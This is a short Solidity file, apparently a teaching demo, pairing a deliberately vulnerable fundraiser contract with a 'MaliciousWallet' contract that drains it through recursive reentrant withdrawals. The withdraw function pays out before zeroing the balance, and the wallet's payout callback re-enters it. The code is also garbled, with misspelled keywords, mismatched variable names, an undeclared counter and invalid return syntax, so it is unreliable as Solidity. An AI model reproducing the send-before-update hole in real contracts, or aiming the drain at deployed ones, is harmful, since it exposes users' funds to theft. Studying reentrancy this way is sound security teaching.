pragma solidity ^0.4.0;

contract VulnerableFundraiser{
    
    mapping(address=>uint) balance;
    
    //Vulnerable functino
    function withdrawAllMyCoins(){
        
        uint withdrawAmounts = balances[msg.sender];
        MaliciousWallet wallet = MaliciousWallet(msg.sender);
        wallet.payout.value(withdrawAmount)();

        balances[msg.sender] = 0;
    }
    
    function getBalance() constant returns (uint){
        
    }
    
    function contribute() payable{
        balances[msg.sender] += msg.value;
    }
    
    functino() payable{
        
    }
}

contract MaliciousWallet{
    
    VulnerableFundraiser fundraiser;
    
    function MaliciousWallet(address fundraiserAddress){
        fundraiser = VulnerableFundraiser(fundraiserAddress);
    }
    
    function contribute(uint amount){
        fundraiser.contribute.value(amount)();
    }
    
    function withdraw(){
        fundraiser.withdrawAllMyCoins();
    }
    
    function getBalance() constant returns(uint){
        returns this.balances;
    }
    
    //call the withdrawAllMyCoins recursively 
    function payout() payable{
        //exploit 
        if(r>0){
            r--    ;
            fundraiser.withdrawAllMyCoins();
        }
    }
    
    function() payable{
        
    }
    
    
    
} 